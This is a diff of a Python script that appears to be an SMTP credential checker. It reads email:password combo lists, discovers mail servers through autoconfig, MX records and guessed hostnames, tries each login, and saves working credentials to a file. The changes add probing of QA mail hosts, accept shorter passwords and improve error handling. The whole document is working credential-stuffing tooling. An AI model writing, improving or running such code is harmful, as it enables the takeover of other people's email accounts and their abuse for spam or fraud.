@@ -6,7 +6,7 @@ try:
 	from dns import resolver
 except ImportError:
 	print('\033[1;33minstalling missing packages...\033[0m')
-	os.system(f'{sys.executable} -m pip install psutil dnspython')
+	os.system(sys.executable+' -m pip install psutil dnspython')
 	import psutil
 	from dns import resolver
 
@@ -86,6 +86,9 @@ def tune_network():
 	except:
 		pass
 
+def first(a):
+	return (a or ['']).pop(0)
+
 def bytes_to_mbit(b):
 	return round(b/1024./1024.*8, 2)
 
@@ -130,14 +133,17 @@ def get_alive_neighbor(ip, port):
 
 def guess_smtp_server(domain):
 	global default_login_template, resolver_obj
-	domains_arr = [domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
+	domains_arr = [domain, 'smtp-qa.'+domain, 'qa-smtp.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
 	try:
 		mx_domain = str(resolver_obj.resolve(domain, 'mx')[0].exchange)[0:-1]
 		domains_arr += [mx_domain]
 	except:
 		pass
 	for host in domains_arr:
-		ip = get_rand_ip_of_host(host)
+		try:
+			ip = get_rand_ip_of_host(host)
+		except:
+			continue
 		for port in [587, 465, 25]:
 			try:
 				if is_listening(ip, port):
@@ -154,11 +160,18 @@ def get_smtp_config(domain):
 			xml = requests.get(autoconfig_url+domain, timeout=5).text
 		except:
 			xml = ''
-		smtp_host = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<hostname>([\w.-]+)</hostname>', xml)
-		smtp_port = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<port>(\d+)</port>', xml)
-		smtp_login_template = re.findall(r'<outgoingServer type="smtp">[\s\S]+?<username>([\w.%]+)</username>', xml)
+		smtp_host = first(re.findall(r'<outgoingServer type="smtp">[\s\S]+?<hostname>([\w.-]+)</hostname>', xml))
+		smtp_port = first(re.findall(r'<outgoingServer type="smtp">[\s\S]+?<port>(\d+)</port>', xml))
+		smtp_login_template = first(re.findall(r'<outgoingServer type="smtp">[\s\S]+?<username>([\w.%]+)</username>', xml))
 		if smtp_host and smtp_port and smtp_login_template:
-			mx_cache[domain] = (smtp_host[0], smtp_port[0], smtp_login_template[0])
+			try:
+				smtp_qa_host = re.sub(r'^[\w-]+\.', smtp_host.split('.')[0]+'-qa.', smtp_host)
+				ip = get_rand_ip_of_host(smtp_qa_host)
+				if is_listening(ip, smtp_port):
+					smtp_host = smtp_qa_host
+			except:
+				pass
+			mx_cache[domain] = (smtp_host, smtp_port, smtp_login_template)
 		else:
 			mx_cache[domain] = guess_smtp_server(domain)
 	if not mx_cache[domain]:
@@ -178,7 +191,7 @@ def get_free_smtp_server(smtp_server, port):
 			raise Exception(e)
 
 def quit(signum, frame):
-	print('\r\n'+inf+cyan('Exiting... See ya later. Bye.',1))
+	print('\r\n'+okk+'Exiting... See ya later. Bye.')
 	sys.exit(0)
 
 def is_valid_email(email):
@@ -258,18 +271,17 @@ def worker_item(jobs_que, results_que):
 			smtp_server, port, smtp_user, password = jobs_que.get()
 			login_template = default_login_template
 			try:
-				results_que.put(yellow('getting settings for ',1)+yellow(smtp_user+':'+password,0))
+				results_que.put(f'getting settings for {smtp_user}:{password}')
 				if not smtp_server or not port:
 					smtp_server, port, login_template = get_smtp_config(smtp_user.split('@')[1])
-				results_que.put(bold('connecting to')+f' {smtp_server}|{port}|{smtp_user}|{password}')
+				results_que.put(blue('connecting to',0)+f' {smtp_server}|{port}|{smtp_user}|{password}')
 				smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
-				results_que.put(green(smtp_user+':'+password,1)+(verify_email and green(' sent to '+verify_email,0)))
+				results_que.put(green(smtp_user+':'+password,7)+(verify_email and green(' sent to '+verify_email,7)))
 				open(smtp_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
 				goods += 1
 				time.sleep(1)
 			except Exception as e:
-				e = str(e).strip()[0:130]
-				results_que.put(red(f'{smtp_server}:{port} - {bold(e)}',0))
+				results_que.put(red(smtp_server+':'+port,0)+' - '+str(e).strip()[0:130])
 			loop_times.append(time.perf_counter() - time_start)
 			loop_times.pop(0) if len(loop_times)>min_threads else 0
 	threads_counter -= 1
@@ -300,7 +312,7 @@ def printer(jobs_que, results_que):
 	global progress, total_lines, speed, loop_time, cpu_usage, mem_usage, net_usage, threads_counter, goods, ignored
 	while True:
 		status_bar = (
-			f'{b}['+red('\u2665',int(time.time()*2)%2)+f'{b}]{z}'+
+			f'{b}['+green('\u2665',int(time.time()*2)%2)+f'{b}]{z}'+
 			f'[ progress: {bold(num(progress))}/{bold(num(total_lines))} ({bold(round(progress/total_lines*100))}%) ]'+
 			f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'+
 			f'[ cpu: {bold(cpu_usage)}% ]'+
@@ -396,7 +408,7 @@ with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
 			else:
 				line = normalize_delimiters(line.strip())
 				fields = line.split(':')
-				if len(fields)>1 and is_valid_email(fields[email_collumn]) and not is_ignored_host(fields[email_collumn]) and len(fields[password_collumn])>7:
+				if len(fields)>1 and is_valid_email(fields[email_collumn]) and not is_ignored_host(fields[email_collumn]) and len(fields[password_collumn])>5:
 					jobs_que.put((False, False, fields[email_collumn], fields[password_collumn]))
 				else:
 					ignored += 1
